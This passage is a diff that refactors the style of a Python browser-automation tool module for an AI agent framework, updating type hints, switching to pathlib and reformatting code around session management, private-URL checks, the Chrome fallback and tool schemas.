@@ -1,6 +1,5 @@
 #!/usr/bin/env python3
-"""
-Browser Tool Module
+"""Browser Tool Module
 
 This module provides browser automation tools using agent-browser CLI.  It
 supports multiple backends — **Browser Use** (cloud, default for Nous
@@ -55,19 +54,21 @@ import json
 import logging
 import os
 import re
-import subprocess
 import shutil
+import subprocess
 import sys
 import tempfile
 import threading
 import time
-import requests
-from typing import Dict, Any, Optional, List, Tuple, Union
 from pathlib import Path
+from typing import Any
+
+import requests
+
 from agent.auxiliary_client import call_llm
+from hermes_cli.config import DEFAULT_CONFIG, cfg_get
 from hermes_constants import get_hermes_home
 from utils import env_int, is_truthy_value
-from hermes_cli.config import DEFAULT_CONFIG, cfg_get
 
 try:
     from tools.website_policy import check_website_access
@@ -76,8 +77,12 @@ except Exception:
 
 try:
     from tools.url_safety import (
-        is_safe_url as _is_safe_url,
         is_always_blocked_url as _is_always_blocked_url,
+    )
+    from tools.url_safety import (
+        is_safe_url as _is_safe_url,
+    )
+    from tools.url_safety import (
         normalize_url_for_request as _normalize_url_for_request,
     )
 except Exception:
@@ -89,20 +94,23 @@ except Exception:
 # and into ``plugins/browser/<vendor>/``. The dispatcher consults the
 # registry; the legacy class names are re-exported below as backward-compat
 # shims for callers that import them from this module.
-from agent.browser_provider import BrowserProvider as CloudBrowserProvider  # noqa: F401  (legacy alias)
-from agent.browser_registry import (  # noqa: F401  (test-patchable surface)
+from agent.browser_provider import (
+    BrowserProvider as CloudBrowserProvider,
+)
+from agent.browser_registry import (
     get_provider as _registry_get_browser_provider,
 )
-from plugins.browser.browserbase.provider import (  # noqa: F401  (legacy import surface)
-    BrowserbaseBrowserProvider as BrowserbaseProvider,
-)
-from plugins.browser.browser_use.provider import (  # noqa: F401
+from plugins.browser.browser_use.provider import (
     BrowserUseBrowserProvider as BrowserUseProvider,
 )
-from plugins.browser.firecrawl.provider import (  # noqa: F401
+from plugins.browser.browserbase.provider import (
+    BrowserbaseBrowserProvider as BrowserbaseProvider,
+)
+from plugins.browser.firecrawl.provider import (
     FirecrawlBrowserProvider as FirecrawlProvider,
 )
 from tools.tool_backend_helpers import normalize_browser_cloud_provider
+
 # Camofox local anti-detection browser backend (optional).
 # When CAMOFOX_URL is set, all browser operations route through the
 # camofox REST API instead of the agent-browser CLI.
@@ -141,13 +149,13 @@ def _discover_homebrew_node_dirs() -> tuple[str, ...]:
     """
     dirs: list[str] = []
     homebrew_opt = "/opt/homebrew/opt"
-    if not os.path.isdir(homebrew_opt):
+    if not Path(homebrew_opt).is_dir():
         return tuple(dirs)
     try:
         for entry in os.listdir(homebrew_opt):
             if entry.startswith("node") and entry != "node":
                 bin_dir = os.path.join(homebrew_opt, entry, "bin")
-                if os.path.isdir(bin_dir):
+                if Path(bin_dir).is_dir():
                     dirs.append(bin_dir)
     except OSError:
         pass
@@ -172,10 +180,11 @@ def _merge_browser_path(existing_path: str = "") -> str:
     for part in _browser_candidate_path_dirs():
         if not part or part in existing_parts or part in prefix_parts:
             continue
-        if os.path.isdir(part):
+        if Path(part).is_dir():
             prefix_parts.append(part)
 
     return os.pathsep.join(prefix_parts + path_parts)
+
 
 # Throttle screenshot cleanup to avoid repeated full directory scans.
 _last_screenshot_cleanup_by_dir: dict[str, float] = {}
@@ -193,7 +202,7 @@ SNAPSHOT_SUMMARIZE_THRESHOLD = 8000
 # Commands that legitimately return empty stdout (e.g. close, record).
 _EMPTY_OK_COMMANDS: frozenset = frozenset({"close", "record"})
 
-_cached_command_timeout: Optional[int] = None
+_cached_command_timeout: int | None = None
 _command_timeout_resolved = False
 
 
@@ -222,12 +231,12 @@ def _get_command_timeout() -> int:
     return result
 
 
-def _get_vision_model() -> Optional[str]:
+def _get_vision_model() -> str | None:
     """Model for browser_vision (screenshot analysis — multimodal)."""
     return os.getenv("AUXILIARY_VISION_MODEL", "").strip() or None
 
 
-def _get_extraction_model() -> Optional[str]:
+def _get_extraction_model() -> str | None:
     """Model for page snapshot text summarization — same as web_extract."""
     return os.getenv("AUXILIARY_WEB_EXTRACT_MODEL", "").strip() or None
 
@@ -309,7 +318,7 @@ def _get_cdp_override() -> str:
     return ""
 
 
-def _get_dialog_policy_config() -> Tuple[str, float]:
+def _get_dialog_policy_config() -> tuple[str, float]:
     """Read ``browser.dialog_policy`` + ``browser.dialog_timeout_s`` from config.
 
     Returns a ``(policy, timeout_s)`` tuple, falling back to the supervisor's
@@ -317,9 +326,9 @@ def _get_dialog_policy_config() -> Tuple[str, float]:
     """
     # Defer imports so browser_tool can be imported in minimal environments.
     from tools.browser_supervisor import (
+        _VALID_POLICIES,
         DEFAULT_DIALOG_POLICY,
         DEFAULT_DIALOG_TIMEOUT_S,
-        _VALID_POLICIES,
     )
 
     try:
@@ -376,7 +385,9 @@ def _ensure_cdp_supervisor(task_id: str) -> None:
     if not cdp_url:
         return
     try:
-        from tools.browser_supervisor import SUPERVISOR_REGISTRY  # type: ignore[import-not-found]
+        from tools.browser_supervisor import (
+            SUPERVISOR_REGISTRY,  # type: ignore[import-not-found]
+        )
 
         policy, timeout_s = _get_dialog_policy_config()
         SUPERVISOR_REGISTRY.get_or_start(
@@ -396,7 +407,9 @@ def _ensure_cdp_supervisor(task_id: str) -> None:
 def _stop_cdp_supervisor(task_id: str) -> None:
     """Stop the CDP supervisor for ``task_id`` if one exists. No-op otherwise."""
     try:
-        from tools.browser_supervisor import SUPERVISOR_REGISTRY  # type: ignore[import-not-found]
+        from tools.browser_supervisor import (
+            SUPERVISOR_REGISTRY,  # type: ignore[import-not-found]
+        )
 
         SUPERVISOR_REGISTRY.stop(task_id)
     except Exception as exc:
@@ -420,7 +433,7 @@ def _stop_cdp_supervisor(task_id: str) -> None:
 # wins. This keeps the test surface stable while letting third-party
 # plugins drop in under ``~/.hermes/plugins/browser/<vendor>/``.
 
-_PROVIDER_REGISTRY: Dict[str, type] = {
+_PROVIDER_REGISTRY: dict[str, type] = {
     "browserbase": BrowserbaseProvider,
     "browser-use": BrowserUseProvider,
     "firecrawl": FirecrawlProvider,
@@ -428,18 +441,18 @@ _PROVIDER_REGISTRY: Dict[str, type] = {
 # Frozen copy of the import-time _PROVIDER_REGISTRY, used by
 # ``_is_legacy_provider_registry_overridden`` to detect test-time
 # monkeypatching. NEVER mutate this dict.
-_DEFAULT_PROVIDER_REGISTRY: Dict[str, type] = dict(_PROVIDER_REGISTRY)
+_DEFAULT_PROVIDER_REGISTRY: dict[str, type] = dict(_PROVIDER_REGISTRY)
 
-_cached_cloud_provider: Optional[CloudBrowserProvider] = None
+_cached_cloud_provider: CloudBrowserProvider | None = None
 _cloud_provider_resolved = False
 _allow_private_urls_resolved = False
-_cached_allow_private_urls: Optional[bool] = None
-_cached_agent_browser: Optional[str] = None
+_cached_allow_private_urls: bool | None = None
+_cached_agent_browser: str | None = None
 _agent_browser_resolved = False
 
 # Lightpanda engine support — cached like _get_cloud_provider().
 # agent-browser v0.25.3+ supports ``--engine lightpanda`` natively.
-_cached_browser_engine: Optional[str] = None
+_cached_browser_engine: str | None = None
 _browser_engine_resolved = False
 
 
@@ -486,7 +499,7 @@ def _ensure_browser_plugins_loaded() -> None:
         logger.debug("Browser plugin discovery failed (non-fatal): %s", exc)
 
 
-def _get_cloud_provider() -> Optional[CloudBrowserProvider]:
+def _get_cloud_provider() -> CloudBrowserProvider | None:
     """Return the configured cloud browser provider, or None for local mode.
 
     Reads ``config["browser"]["cloud_provider"]`` once and caches the result
@@ -507,7 +520,7 @@ def _get_cloud_provider() -> Optional[CloudBrowserProvider]:
     if _cloud_provider_resolved:
         return _cached_cloud_provider
 
-    resolved: Optional[CloudBrowserProvider] = None
+    resolved: CloudBrowserProvider | None = None
     try:
         from hermes_cli.config import read_raw_config
         cfg = read_raw_config()
@@ -515,7 +528,7 @@ def _get_cloud_provider() -> Optional[CloudBrowserProvider]:
         provider_key = None
         if isinstance(browser_cfg, dict) and "cloud_provider" in browser_cfg:
             provider_key = normalize_browser_cloud_provider(
-                browser_cfg.get("cloud_provider")
+                browser_cfg.get("cloud_provider"),
             )
             if provider_key == "local":
                 _cached_cloud_provider = None
@@ -713,7 +726,7 @@ def _using_lightpanda_engine() -> bool:
     return _get_browser_engine() == "lightpanda"
 
 
-def _lightpanda_fallback_reason(engine: str, command: str, result: Dict[str, Any]) -> Optional[str]:
+def _lightpanda_fallback_reason(engine: str, command: str, result: dict[str, Any]) -> str | None:
     """Return the user-visible reason a Lightpanda result needs Chrome fallback.
 
     ``None`` means no fallback should run.  The returned string is copied into
@@ -751,7 +764,7 @@ def _lightpanda_fallback_reason(engine: str, command: str, result: Dict[str, Any
         path = data.get("path", "")
         if path:
             try:
-                size = os.path.getsize(path)
+                size = Path(path).stat().st_size
                 if size < 20480:
                     logger.debug("Lightpanda screenshot is suspiciously small (%d bytes), "
                                  "triggering Chrome fallback", size)
@@ -765,12 +778,12 @@ def _lightpanda_fallback_reason(engine: str, command: str, result: Dict[str, Any
     return None
 
 
-def _needs_lightpanda_fallback(engine: str, command: str, result: Dict[str, Any]) -> bool:
+def _needs_lightpanda_fallback(engine: str, command: str, result: dict[str, Any]) -> bool:
     """Check if a Lightpanda result should trigger an automatic Chrome fallback."""
     return _lightpanda_fallback_reason(engine, command, result) is not None
 
 
-def _annotate_lightpanda_fallback(result: Dict[str, Any], reason: str) -> Dict[str, Any]:
+def _annotate_lightpanda_fallback(result: dict[str, Any], reason: str) -> dict[str, Any]:
     """Add a user-visible Chrome fallback warning to a browser command result."""
     warning = (
         "⚠ Lightpanda fallback: Chrome was used for this browser action. "
@@ -797,7 +810,7 @@ def _annotate_lightpanda_fallback(result: Dict[str, Any], reason: str) -> Dict[s
     return annotated
 
 
-def _copy_fallback_warning(target: Dict[str, Any], result: Dict[str, Any]) -> Dict[str, Any]:
+def _copy_fallback_warning(target: dict[str, Any], result: dict[str, Any]) -> dict[str, Any]:
     """Copy browser fallback metadata from an internal result into a tool response."""
     if result.get("fallback_warning"):
         target["fallback_warning"] = result["fallback_warning"]
@@ -809,9 +822,9 @@ def _copy_fallback_warning(target: Dict[str, Any], result: Dict[str, Any]) -> Di
 def _run_chrome_fallback_command(
     task_id: str,
     command: str,
-    args: List[str],
+    args: list[str],
     timeout: int,
-) -> Dict[str, Any]:
+) -> dict[str, Any]:
     """Run a browser command in a temporary Chrome session at the current URL.
 
     agent-browser locks the engine when a named daemon starts. Passing
@@ -826,7 +839,7 @@ def _run_chrome_fallback_command(
     # ``_engine_override=\"auto\"`` so this helper does not recursively trigger
     # Lightpanda→Chrome fallback if the eval call itself fails.
     url_result = _run_browser_command(
-        task_id, "eval", ["window.location.href"], timeout=10, _engine_override="auto"
+        task_id, "eval", ["window.location.href"], timeout=10, _engine_override="auto",
     )
     current_url = None
     if url_result.get("success"):
@@ -870,14 +883,14 @@ def _run_chrome_fallback_command(
     base_args = cmd_prefix + ["--engine", "chrome", "--session", tmp_session, "--json"]
 
     task_socket_dir = os.path.join(_socket_safe_tmpdir(), f"agent-browser-{tmp_session}")
-    os.makedirs(task_socket_dir, mode=0o700, exist_ok=True)
+    Path(task_socket_dir).mkdir(mode=0o700, exist_ok=True, parents=True)
     browser_env = {**os.environ, "AGENT_BROWSER_SOCKET_DIR": task_socket_dir}
     browser_env["PATH"] = _merge_browser_path(browser_env.get("PATH", ""))
 
     if "AGENT_BROWSER_IDLE_TIMEOUT_MS" not in browser_env:
         browser_env["AGENT_BROWSER_IDLE_TIMEOUT_MS"] = str(BROWSER_SESSION_INACTIVITY_TIMEOUT * 1000)
 
-    def _run_tmp(cmd: str, cmd_args: List[str]) -> Dict[str, Any]:
+    def _run_tmp(cmd: str, cmd_args: list[str]) -> dict[str, Any]:
         full = base_args + [cmd] + cmd_args
         # Use temp-file stdout/stderr pattern (same as _run_browser_command)
         # to avoid pipe hang from agent-browser daemon inheriting fds.
@@ -936,7 +949,7 @@ def _run_chrome_fallback_command(
             proc.wait()
             return {"success": False, "error": f"Chrome fallback '{cmd}' timed out"}
         try:
-            with open(stdout_path, "r", encoding="utf-8") as f:
+            with Path(stdout_path).open(encoding="utf-8") as f:
                 stdout = f.read().strip()
             if stdout:
                 return json.loads(stdout.split("\n")[-1])
@@ -945,7 +958,7 @@ def _run_chrome_fallback_command(
         finally:
             for pth in (stdout_path, stderr_path):
                 try:
-                    os.unlink(pth)
+                    Path(pth).unlink()
                 except OSError:
                     pass
         return {"success": False, "error": f"Chrome fallback '{cmd}' failed"}
@@ -973,9 +986,9 @@ def _run_chrome_fallback_command(
 
 def _chrome_fallback_screenshot(
     task_id: str,
-    args: List[str],
+    args: list[str],
     timeout: int,
-) -> Dict[str, Any]:
+) -> dict[str, Any]:
     """Take a screenshot using a temporary Chrome session."""
     return _run_chrome_fallback_command(task_id, "screenshot", args, timeout)
 
@@ -1002,7 +1015,7 @@ def _auto_local_for_private_urls() -> bool:
         browser_cfg = cfg.get("browser", {})
         if isinstance(browser_cfg, dict) and "auto_local_for_private_urls" in browser_cfg:
             _cached_auto_local_for_private_urls = bool(
-                browser_cfg.get("auto_local_for_private_urls")
+                browser_cfg.get("auto_local_for_private_urls"),
             )
     except Exception as e:
         logger.debug("Could not read auto_local_for_private_urls from config: %s", e)
@@ -1021,9 +1034,9 @@ def _url_is_private(url: str) -> bool:
         # is_safe_url returns False for private/loopback/link-local/CGNAT AND
         # for DNS failures.  We only want the private-network case here, so
         # we parse + check the host shape as a DNS-failure sieve first.
-        from urllib.parse import urlparse
         import ipaddress
         import socket
+        from urllib.parse import urlparse
         parsed = urlparse(url)
         hostname = (parsed.hostname or "").strip().lower().rstrip(".")
         if not hostname:
@@ -1046,7 +1059,7 @@ def _url_is_private(url: str) -> bool:
         # Hostname — must resolve to confirm it's private (bare "localhost"
         # resolves to 127.0.0.1 via /etc/hosts).  Short-circuit on obvious
         # names to avoid a DNS hop.
-        if hostname in {"localhost",} or hostname.endswith(".localhost"):
+        if hostname in {"localhost"} or hostname.endswith(".localhost"):
             return True
         if hostname.endswith(".local") or hostname.endswith(".lan") or hostname.endswith(".internal"):
             return True
@@ -1138,7 +1151,7 @@ def _allow_private_urls() -> bool:
         browser_cfg = cfg.get("browser", {})
         if isinstance(browser_cfg, dict):
             _cached_allow_private_urls = is_truthy_value(
-                browser_cfg.get("allow_private_urls"), default=False
+                browser_cfg.get("allow_private_urls"), default=False,
             )
     except Exception as e:
         logger.debug("Could not read allow_private_urls from config: %s", e)
@@ -1171,7 +1184,7 @@ def _socket_safe_tmpdir() -> str:
 # cleanup_browser code paths — the key is opaque to those internals.
 #
 # Stores: session_name (always), bb_session_id + cdp_url (cloud mode only)
-_active_sessions: Dict[str, Dict[str, str]] = {}  # session_key -> {session_name, ...}
+_active_sessions: dict[str, dict[str, str]] = {}  # session_key -> {session_name, ...}
 _recording_sessions: set = set()  # session_keys with active recordings
 
 # Tracks the most recent session_key used per task_id. Set by browser_navigate()
@@ -1179,7 +1192,7 @@ _recording_sessions: set = set()  # session_keys with active recordings
 # (snapshot/click/fill/eval/...) so they target the session that served the last
 # navigation.  Without this, a task that navigated to localhost on the local
 # sidecar would fall back to the cloud session on its next snapshot call.
-_last_active_session_key: Dict[str, str] = {}  # task_id -> session_key
+_last_active_session_key: dict[str, str] = {}  # task_id -> session_key
 _LOCAL_SUFFIX = "::local"
 
 # Flag to track if cleanup has been done
@@ -1193,7 +1206,7 @@ _cleanup_done = False
 # config.yaml is authoritative; BROWSER_INACTIVITY_TIMEOUT remains a legacy
 # fallback so old deployments keep working if they have not migrated yet.
 DEFAULT_SESSION_INACTIVITY_TIMEOUT = int(
-    DEFAULT_CONFIG.get("browser", {}).get("inactivity_timeout", 120)
+    DEFAULT_CONFIG.get("browser", {}).get("inactivity_timeout", 120),
 )
 
 
@@ -1213,7 +1226,7 @@ def _get_session_inactivity_timeout() -> int:
 BROWSER_SESSION_INACTIVITY_TIMEOUT = _get_session_inactivity_timeout()
 
 # Track last activity time per session
-_session_last_activity: Dict[str, float] = {}
+_session_last_activity: dict[str, float] = {}
 
 # Background cleanup thread state
 _cleanup_thread = None
@@ -1224,8 +1237,7 @@ _cleanup_lock = threading.Lock()
 
 
 def _emergency_cleanup_all_sessions():
-    """
-    Emergency cleanup of all active browser sessions.
+    """Emergency cleanup of all active browser sessions.
     Called on process exit or interrupt to prevent orphaned sessions.
 
     Also runs the orphan reaper to clean up daemons left behind by previously
@@ -1275,8 +1287,7 @@ atexit.register(_emergency_cleanup_all_sessions)
 # =============================================================================
 
 def _cleanup_inactive_browser_sessions():
-    """
-    Clean up browser sessions that have been inactive for longer than the timeout.
+    """Clean up browser sessions that have been inactive for longer than the timeout.
 
     This function is called periodically by the background cleanup thread to
     automatically close sessions that haven't been used recently, preventing
@@ -1296,8 +1307,7 @@ def _cleanup_inactive_browser_sessions():
             logger.info("Cleaning up inactive session for task: %s (inactive for %ss)", task_id, elapsed)
             cleanup_browser(task_id)
             with _cleanup_lock:
-                if task_id in _session_last_activity:
-                    del _session_last_activity[task_id]
+                _session_last_activity.pop(task_id, None)
         except Exception as e:
             logger.warning("Error cleaning up inactive session %s: %s", task_id, e)
 
@@ -1313,8 +1323,7 @@ def _write_owner_pid(socket_dir: str, session_name: str) -> None:
     """
     try:
         path = os.path.join(socket_dir, f"{session_name}.owner_pid")
-        with open(path, "w", encoding="utf-8") as f:
-            f.write(str(os.getpid()))
+        Path(path).write_text(str(os.getpid()), encoding="utf-8")
     except OSError as exc:
         logger.debug("Could not write owner_pid file for %s: %s",
                      session_name, exc)
@@ -1460,8 +1469,8 @@ def _reap_orphaned_browser_sessions():
 
         # Ownership check: prefer owner_pid file (cross-process safe).
         owner_pid_file = os.path.join(socket_dir, f"{session_name}.owner_pid")
-        owner_alive: Optional[bool] = None  # None = owner_pid missing/unreadable
-        if os.path.isfile(owner_pid_file):
+        owner_alive: bool | None = None  # None = owner_pid missing/unreadable
+        if Path(owner_pid_file).is_file():
             try:
                 owner_pid = int(Path(owner_pid_file).read_text(encoding="utf-8").strip())
                 # ``os.kill(pid, 0)`` is NOT a no-op on Windows (bpo-14484).
@@ -1483,7 +1492,7 @@ def _reap_orphaned_browser_sessions():
 
         # owner_alive is False (dead owner) OR legacy daemon not tracked here.
         pid_file = os.path.join(socket_dir, f"{session_name}.pid")
-        if not os.path.isfile(pid_file):
+        if not Path(pid_file).is_file():
             # No daemon PID file — just a stale dir, remove it
             shutil.rmtree(socket_dir, ignore_errors=True)
             continue
@@ -1532,8 +1541,7 @@ def _reap_orphaned_browser_sessions():
 
 
 def _browser_cleanup_thread_worker():
-    """
-    Background thread that periodically cleans up inactive browser sessions.
+    """Background thread that periodically cleans up inactive browser sessions.
 
     Runs every 30 seconds and checks for sessions that haven't been used
     within the BROWSER_SESSION_INACTIVITY_TIMEOUT period.
@@ -1568,7 +1576,7 @@ def _start_browser_cleanup_thread():
             _cleanup_thread = threading.Thread(
                 target=_browser_cleanup_thread_worker,
                 daemon=True,
-                name="browser-cleanup"
+                name="browser-cleanup",
             )
             _cleanup_thread.start()
             logger.info("Started inactivity cleanup thread (timeout: %ss)", BROWSER_SESSION_INACTIVITY_TIMEOUT)
@@ -1605,11 +1613,11 @@ BROWSER_TOOL_SCHEMAS = [
             "properties": {
                 "url": {
                     "type": "string",
-                    "description": "The URL to navigate to (e.g., 'https://example.com')"
-                }
+                    "description": "The URL to navigate to (e.g., 'https://example.com')",
+                },
             },
-            "required": ["url"]
-        }
+            "required": ["url"],
+        },
     },
     {
         "name": "browser_snapshot",
@@ -1620,11 +1628,11 @@ BROWSER_TOOL_SCHEMAS = [
                 "full": {
                     "type": "boolean",
                     "description": "If true, returns complete page content. If false (default), returns compact view with interactive elements only.",
-                    "default": False
-                }
+                    "default": False,
+                },
             },
-            "required": []
-        }
+            "required": [],
+        },
     },
     {
         "name": "browser_click",
@@ -1634,11 +1642,11 @@ BROWSER_TOOL_SCHEMAS = [
             "properties": {
                 "ref": {
                     "type": "string",
-                    "description": "The element reference from the snapshot (e.g., '@e5', '@e12')"
-                }
+                    "description": "The element reference from the snapshot (e.g., '@e5', '@e12')",
+                },
             },
-            "required": ["ref"]
-        }
+            "required": ["ref"],
+        },
     },
     {
         "name": "browser_type",
@@ -1648,15 +1656,15 @@ BROWSER_TOOL_SCHEMAS = [
             "properties": {
                 "ref": {
                     "type": "string",
-                    "description": "The element reference from the snapshot (e.g., '@e3')"
+                    "description": "The element reference from the snapshot (e.g., '@e3')",
                 },
                 "text": {
                     "type": "string",
-                    "description": "The text to type into the field"
-                }
+                    "description": "The text to type into the field",
+                },
             },
-            "required": ["ref", "text"]
-        }
+            "required": ["ref", "text"],
+        },
     },
     {
         "name": "browser_scroll",
@@ -1667,11 +1675,11 @@ BROWSER_TOOL_SCHEMAS = [
                 "direction": {
                     "type": "string",
                     "enum": ["up", "down"],
-                    "description": "Direction to scroll"
-                }
+                    "description": "Direction to scroll",
+                },
             },
-            "required": ["direction"]
-        }
+            "required": ["direction"],
+        },
     },
     {
         "name": "browser_back",
@@ -1679,8 +1687,8 @@ BROWSER_TOOL_SCHEMAS = [
         "parameters": {
             "type": "object",
             "properties": {},
-            "required": []
-        }
+            "required": [],
+        },
     },
     {
         "name": "browser_press",
@@ -1690,11 +1698,11 @@ BROWSER_TOOL_SCHEMAS = [
             "properties": {
                 "key": {
                     "type": "string",
-                    "description": "Key to press (e.g., 'Enter', 'Tab', 'Escape', 'ArrowDown')"
-                }
+                    "description": "Key to press (e.g., 'Enter', 'Tab', 'Escape', 'ArrowDown')",
+                },
             },
-            "required": ["key"]
-        }
+            "required": ["key"],
+        },
     },
     {
         "name": "browser_get_images",
@@ -1702,8 +1710,8 @@ BROWSER_TOOL_SCHEMAS = [
         "parameters": {
             "type": "object",
             "properties": {},
-            "required": []
-        }
+            "required": [],
+        },
     },
     {
         "name": "browser_vision",
@@ -1713,16 +1721,16 @@ BROWSER_TOOL_SCHEMAS = [
             "properties": {
                 "question": {
                     "type": "string",
-                    "description": "What you want to know about the page visually. Be specific about what you're looking for."
+                    "description": "What you want to know about the page visually. Be specific about what you're looking for.",
                 },
                 "annotate": {
                     "type": "boolean",
                     "default": False,
-                    "description": "If true, overlay numbered [N] labels on interactive elements. Each [N] maps to ref @eN for subsequent browser commands. Useful for QA and spatial reasoning about page layout."
-                }
+                    "description": "If true, overlay numbered [N] labels on interactive elements. Each [N] maps to ref @eN for subsequent browser commands. Useful for QA and spatial reasoning about page layout.",
+                },
             },
-            "required": ["question"]
-        }
+            "required": ["question"],
+        },
     },
     {
         "name": "browser_console",
@@ -1733,15 +1741,15 @@ BROWSER_TOOL_SCHEMAS = [
                 "clear": {
                     "type": "boolean",
                     "default": False,
-                    "description": "If true, clear the message buffers after reading"
+                    "description": "If true, clear the message buffers after reading",
                 },
                 "expression": {
                     "type": "string",
-                    "description": "JavaScript expression to evaluate in the page context. Runs in the browser like DevTools console — full access to DOM, window, document. Return values are serialized to JSON. Example: 'document.title' or 'document.querySelectorAll(\"a\").length'"
-                }
+                    "description": "JavaScript expression to evaluate in the page context. Runs in the browser like DevTools console — full access to DOM, window, document. Return values are serialized to JSON. Example: 'document.title' or 'document.querySelectorAll(\"a\").length'",
+                },
             },
-            "required": []
-        }
+            "required": [],
+        },
     },
 ]
 
@@ -1750,7 +1758,7 @@ BROWSER_TOOL_SCHEMAS = [
 # Utility Functions
 # ============================================================================
 
-def _create_local_session(task_id: str) -> Dict[str, str]:
+def _create_local_session(task_id: str) -> dict[str, str]:
     import uuid
     session_name = f"h_{uuid.uuid4().hex[:10]}"
     logger.info("Created local browser session %s for task %s",
@@ -1763,7 +1771,7 @@ def _create_local_session(task_id: str) -> Dict[str, str]:
     }
 
 
-def _create_cdp_session(task_id: str, cdp_url: str) -> Dict[str, str]:
+def _create_cdp_session(task_id: str, cdp_url: str) -> dict[str, str]:
     """Create a session that connects to a user-supplied CDP endpoint."""
     import uuid
     session_name = f"cdp_{uuid.uuid4().hex[:10]}"
@@ -1777,9 +1785,8 @@ def _create_cdp_session(task_id: str, cdp_url: str) -> Dict[str, str]:
     }
 
 
-def _get_session_info(task_id: Optional[str] = None) -> Dict[str, str]:
-    """
-    Get or create session info for the given session key.
+def _get_session_info(task_id: str | None = None) -> dict[str, str]:
+    """Get or create session info for the given session key.
 
     In cloud mode, creates a Browserbase session with proxies enabled.
     In local mode, generates a session name for agent-browser --session.
@@ -1794,6 +1801,7 @@ def _get_session_info(task_id: Optional[str] = None) -> Dict[str, str]:
 
     Returns:
         Dict with session_name (always), bb_session_id + cdp_url (cloud only)
+
     """
     if task_id is None:
         task_id = "default"
@@ -1849,7 +1857,7 @@ def _get_session_info(task_id: Optional[str] = None) -> Dict[str, str]:
                 except Exception as local_error:
                     raise RuntimeError(
                         f"Cloud provider {provider_name} failed ({e}) and local "
-                        f"fallback also failed ({local_error})"
+                        f"fallback also failed ({local_error})",
                     ) from e
                 # Mark session as degraded for observability
                 if isinstance(session_info, dict):
@@ -1876,10 +1884,8 @@ def _get_session_info(task_id: Optional[str] = None) -> Dict[str, str]:
     return session_info
 
 
-
 def _find_agent_browser() -> str:
-    """
-    Find the agent-browser CLI executable.
+    """Find the agent-browser CLI executable.
 
     Checks in order: current PATH, Homebrew/common bin dirs, Hermes-managed
     node, local node_modules/.bin/, npx fallback.
@@ -1889,6 +1895,7 @@ def _find_agent_browser() -> str:
 
     Raises:
         FileNotFoundError: If agent-browser is not installed
+
     """
     global _cached_agent_browser, _agent_browser_resolved
     if _agent_browser_resolved:
@@ -1897,7 +1904,7 @@ def _find_agent_browser() -> str:
                 "agent-browser CLI not found (cached). Install it with: "
                 f"{_browser_install_hint()}\n"
                 "Or run 'npm install' in the repo root to install locally.\n"
-                "Or ensure npx is available in your PATH."
+                "Or ensure npx is available in your PATH.",
             )
         return _cached_agent_browser
 
@@ -1976,11 +1983,11 @@ def _find_agent_browser() -> str:
         "agent-browser CLI not found. Install it with: "
         f"{_browser_install_hint()}\n"
         "Or run 'npm install' in the repo root to install locally.\n"
-        "Or ensure npx is available in your PATH."
+        "Or ensure npx is available in your PATH.",
     )
 
 
-def _extract_screenshot_path_from_text(text: str) -> Optional[str]:
+def _extract_screenshot_path_from_text(text: str) -> str | None:
     """Extract a screenshot file path from agent-browser human-readable output."""
     if not text:
         return None
@@ -2004,12 +2011,11 @@ def _extract_screenshot_path_from_text(text: str) -> Optional[str]:
 def _run_browser_command(
     task_id: str,
     command: str,
-    args: List[str] = None,
-    timeout: Optional[int] = None,
-    _engine_override: Optional[str] = None,
-) -> Dict[str, Any]:
-    """
-    Run an agent-browser CLI command using our pre-created Browserbase session.
+    args: list[str] = None,
+    timeout: int | None = None,
+    _engine_override: str | None = None,
+) -> dict[str, Any]:
+    """Run an agent-browser CLI command using our pre-created Browserbase session.
 
     Args:
         task_id: Task identifier to get the right session
@@ -2023,6 +2029,7 @@ def _run_browser_command(
 
     Returns:
         Parsed JSON response from agent-browser
+
     """
     if timeout is None:
         timeout = _get_command_timeout()
@@ -2068,7 +2075,7 @@ def _run_browser_command(
         session_info = _get_session_info(task_id)
     except Exception as e:
         logger.warning("Failed to create browser session for task=%s: %s", task_id, e)
-        return {"success": False, "error": f"Failed to create browser session: {str(e)}"}
+        return {"success": False, "error": f"Failed to create browser session: {e!s}"}
 
     # Build the command with the appropriate backend flag.
     # Cloud mode: --cdp <websocket_url> connects to Browserbase.
@@ -2102,7 +2109,7 @@ def _run_browser_command(
 
     cmd_parts = cmd_prefix + backend_args + [
         "--json",
-        command
+        command,
     ] + args
 
     try:
@@ -2111,12 +2118,12 @@ def _run_browser_command(
         # causing "Failed to create socket directory: Permission denied" errors.
         task_socket_dir = os.path.join(
             _socket_safe_tmpdir(),
-            f"agent-browser-{session_info['session_name']}"
+            f"agent-browser-{session_info['session_name']}",
         )
-        os.makedirs(task_socket_dir, mode=0o700, exist_ok=True)
+        Path(task_socket_dir).mkdir(mode=0o700, exist_ok=True, parents=True)
         # Record this hermes PID as the session owner (cross-process safe
         # orphan detection — see _write_owner_pid).
-        _write_owner_pid(task_socket_dir, session_info['session_name'])
+        _write_owner_pid(task_socket_dir, session_info["session_name"])
         logger.debug("browser cmd=%s task=%s socket_dir=%s (%d chars)",
                      command, task_id, task_socket_dir, len(task_socket_dir))
 
@@ -2156,12 +2163,12 @@ def _run_browser_command(
                 # Detect AppArmor user namespace restrictions (Ubuntu 23.10+)
                 _userns_restrict = "/proc/sys/kernel/apparmor_restrict_unprivileged_userns"
                 try:
-                    with open(_userns_restrict, encoding="utf-8") as _f:
+                    with Path(_userns_restrict).open(encoding="utf-8") as _f:
                         if _f.read().strip() == "1":
                             _needs_sandbox_bypass = True
                             logger.debug(
                                 "browser: AppArmor userns restrictions detected — "
-                                "injecting --no-sandbox"
+                                "injecting --no-sandbox",
                             )
                 except OSError:
                     pass
@@ -2219,16 +2226,14 @@ def _run_browser_command(
             result = {"success": False, "error": f"Command timed out after {timeout} seconds"}
             # Fall through to fallback check below
         else:
-            with open(stdout_path, "r", encoding="utf-8") as f:
-                stdout = f.read()
-            with open(stderr_path, "r", encoding="utf-8") as f:
-                stderr = f.read()
+            stdout = Path(stdout_path).read_text(encoding="utf-8")
+            stderr = Path(stderr_path).read_text(encoding="utf-8")
             returncode = proc.returncode
 
             # Clean up temp files (best-effort)
             for p in (stdout_path, stderr_path):
                 try:
-                    os.unlink(p)
+                    Path(p).unlink()
                 except OSError:
                     pass
 
@@ -2283,12 +2288,12 @@ def _run_browser_command(
                         else:
                             result = {
                                 "success": False,
-                                "error": f"Non-JSON output from agent-browser for '{command}': {raw}"
+                                "error": f"Non-JSON output from agent-browser for '{command}': {raw}",
                             }
                     else:
                         result = {
                             "success": False,
-                            "error": f"Non-JSON output from agent-browser for '{command}': {raw}"
